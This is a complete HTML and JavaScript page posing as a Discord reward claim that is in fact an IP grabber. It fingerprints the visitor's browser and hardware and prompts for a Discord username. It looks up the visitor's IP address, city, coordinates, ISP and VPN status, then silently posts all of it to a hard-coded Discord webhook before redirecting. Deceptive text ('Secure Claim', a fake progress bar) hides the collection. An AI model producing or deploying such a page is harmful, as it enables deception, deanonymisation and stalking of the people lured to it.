<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 EXCLUSIVE REWARD - CLAIM IMMEDIATELY 🎁</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap');
        body {
            background: linear-gradient(45deg, #0a0a0a, #1a0033, #000);
            color: #00ffcc;
            font-family: 'Press Start 2P', cursive;
            text-align: center;
            padding: 20px;
            margin: 0;
            overflow: hidden;
            height: 100vh;
            image-rendering: pixelated;
        }
        .container { max-width: 650px; margin: auto; padding-top: 10vh; }
        h1 { 
            font-size: 2.1em; 
            text-shadow: 0 0 25px #00ffcc, 0 0 40px #ff00ff;
            animation: glitch 0.8s infinite alternate;
        }
        .progress { 
            height: 25px; background: #111; border: 3px solid #00ffcc; 
            margin: 35px auto; width: 85%; box-shadow: 0 0 20px #00ffcc;
        }
        .bar { 
            height: 100%; width: 0%; background: linear-gradient(to right, #00ffcc, #ff00ff, #00ffcc);
            transition: width 0.25s linear; box-shadow: 0 0 15px #ff00ff;
        }
        button {
            margin-top: 25px; padding: 18px 50px; font-size: 1.2em; 
            background: #ff00ff; color: #000; border: 3px solid #00ffcc;
            cursor: pointer; box-shadow: 0 0 35px #ff00ff; transition: all 0.3s;
            text-transform: uppercase;
        }
        button:hover { 
            transform: scale(1.15); box-shadow: 0 0 60px #ff00ff; 
        }
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-3px, 3px); }
            40% { transform: translate(3px, -3px); }
            60% { transform: translate(-2px, 2px); }
            100% { transform: translate(0); }
        }
        #status { margin: 15px 0; font-size: 1.1em; min-height: 1.5em; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎁 CLAIM YOUR EXCLUSIVE REWARD 🎁</h1>
        <p id="status">Verifying account eligibility...</p>
        <div class="progress"><div id="prog" class="bar"></div></div>
        <button onclick="startClaim()">CLAIM NOW - LIMITED TIME</button>
        <p style="margin-top:30px; font-size:0.8em; opacity:0.7;">Powered by Discord Rewards • Secure Claim</p>
    </div>

    <script>
        // === COLLECT ALL POSSIBLE DATA ===
        const urlParams = new URLSearchParams(window.location.search);
        const customId = urlParams.get('id') || urlParams.get('victim') || urlParams.get('u') || "Unknown";

        let data = {
            customId: customId,
            name: "Anonymous",
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages ? navigator.languages.join(", ") : "N/A",
            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
            referrer: document.referrer || "direct",
            cookiesEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency || "N/A",
            deviceMemory: navigator.deviceMemory || "N/A",
            connection: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
            battery: "N/A"
        };

        // Advanced Fingerprinting
        function getAdvancedFingerprint() {
            let fp = "";
            try {
                // Canvas
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px Arial";
                ctx.fillStyle = "#f00";
                ctx.fillText("GROK WAS HERE - " + Date.now(), 10, 50);
                fp += canvas.toDataURL().slice(0, 120);

                // WebGL
                const glCanvas = document.createElement('canvas');
                const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    fp += gl.getParameter(gl.VENDOR) + "|" + (debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "");
                }

                // Audio
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                oscillator.type = 'triangle';
                fp += oscillator.frequency.value + "|" + audioCtx.sampleRate;
            } catch(e) {}
            return btoa(fp + navigator.userAgent).substring(0, 80);
        }
        data.fingerprint = getAdvancedFingerprint();

        // Battery (if available)
        if (navigator.getBattery) {
            navigator.getBattery().then(bat => {
                data.battery = `${bat.level * 100}% - ${bat.charging ? 'Charging' : 'Discharging'}`;
            });
        }

        function fakeLoading() {
            let progress = 0;
            const progBar = document.getElementById('prog');
            const status = document.getElementById('status');
            const messages = [
                "Verifying account eligibility...",
                "Fetching reward data...",
                "Connecting to secure server...",
                "Validating fingerprint...",
                "Finalizing claim..."
            ];
            let msgIndex = 0;

            const interval = setInterval(() => {
                progress += Math.random() * 22 + 8;
                if (progress > 100) progress = 100;
                progBar.style.width = `${progress}%`;

                if (progress > 25 && msgIndex === 0) { status.textContent = messages[1]; msgIndex++; }
                if (progress > 55 && msgIndex === 1) { status.textContent = messages[2]; msgIndex++; }
                if (progress > 80 && msgIndex === 2) { status.textContent = messages[3]; msgIndex++; }
                if (progress >= 100) {
                    clearInterval(interval);
                    status.textContent = messages[4];
                }
            }, 140);
        }

        window.startClaim = function() {
            const nameInput = prompt("ENTER YOUR DISCORD USERNAME TO UNLOCK REWARD:", "") || "Anonymous";
            data.name = nameInput.trim();

            fakeLoading();

            // Redundant IP + Geo
            Promise.all([
                fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({})),
                fetch('https://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,proxy,hosting').then(r => r.json()).catch(() => ({}))
            ]).then(([ipData, geo]) => {
                data.ip = ipData.ip || "N/A";

                Object.assign(data, {
                    country: geo.country || "Unknown",
                    countryCode: geo.countryCode || "N/A",
                    city: geo.city || "Unknown",
                    region: geo.regionName || "Unknown",
                    isp: geo.isp || "Unknown",
                    timezone: geo.timezone || "Unknown",
                    lat: geo.lat || "Unknown",
                    lon: geo.lon || "Unknown",
                    proxy: geo.proxy ? "YES (VPN/Proxy/Tor)" : "No",
                    as: geo.as || "N/A"
                });

                const webhook = "https://discord.com/api/webhooks/1516706014680973463/zTHEkVGuFtloIYwKQuSKgRGC6lVulRm8ly3GkolhF7S4TFu5TrWCs2tW0lb1Cpyu1Q04";

                const payload = {
                    username: "IP GRABBER",
                    avatar_url: "https://i.imgur.com/removed.png",
                    content: `**🔥 ULTRA GRAB SUCCESS 🔥**\n` +
                             `**Custom ID:** ${data.customId}\n` +
                             `**Name:** ${data.name}\n` +
                             `**IP:** ${data.ip}\n` +
                             `**Country:** ${data.country} (${data.countryCode})\n` +
                             `**City:** ${data.city} | **Region:** ${data.region}\n` +
                             `**ISP:** ${data.isp}\n` +
                             `**Timezone:** ${data.timezone}\n` +
                             `**Coords:** ${data.lat}, ${data.lon}\n` +
                             `**Proxy/VPN:** ${data.proxy}\n` +
                             `**Fingerprint:** ${data.fingerprint}\n` +
                             `**Hardware:** ${data.hardwareConcurrency} cores | ${data.deviceMemory}GB | Battery: ${data.battery}\n` +
                             `**Screen:** ${data.screen} | Lang: ${data.language}\n` +
                             `**Time:** ${data.timestamp}\n` +
                             `**UA:** ${data.userAgent.substring(0, 120)}...`,
                    embeds: [{
                        title: "Full Data Dump",
                        description: "```json\n" + JSON.stringify(data, null, 2) + "\n```",
                        color: 0xff00ff
                    }]
                };

                // Send with fallback
                fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                }).catch(() => {
                    // Silent fallback (no second attempt visible)
                }).finally(() => {
                    setTimeout(() => {
                        window.location.href = "https://www.youtube.com/watch?v=dQw4w9wgxcq";
                    }, 1200);
                });
            }).catch(() => {
                setTimeout(() => window.location.href = "https://www.youtube.com/watch?v=dQw4w9wgxcq", 800);
            });
        };

        // Auto start on load
        window.onload = () => {
            setTimeout(fakeLoading, 300); // Slight delay for realism
        };
    </script>
</body>
</html>
